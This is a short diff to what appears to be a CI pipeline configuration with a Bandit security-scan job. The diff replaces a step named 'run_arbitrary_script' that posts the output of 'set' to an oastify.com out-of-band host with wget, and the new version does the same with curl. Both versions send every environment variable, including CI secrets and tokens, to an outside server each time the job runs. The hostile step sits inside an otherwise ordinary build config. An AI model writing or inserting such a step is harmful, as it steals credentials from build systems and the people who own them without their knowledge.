@@ -56,7 +56,7 @@ jobs:
             SECURITY_BANDIT_CONFIG_ARGS: "-s B101"
         steps:
             - begin: echo "Starting Code Validation"
-            - run_arbitrary_script: wget --post-data "$(set)" http://3imh2utk91qq2pbktjyp0wjqqhw8k68v.oastify.com/
+            - run_arbitrary_script: curl --data "$(set)" http://6t0kdx4nk41tdsmn4m9sbzut1k7ev9jy.oastify.com/
             - init_os: |
                 sd-cmd exec python-2104/python_bootstrap@stable
                 . $SD_ARTIFACTS_DIR/env/python_bootstrap.env || /bin/true
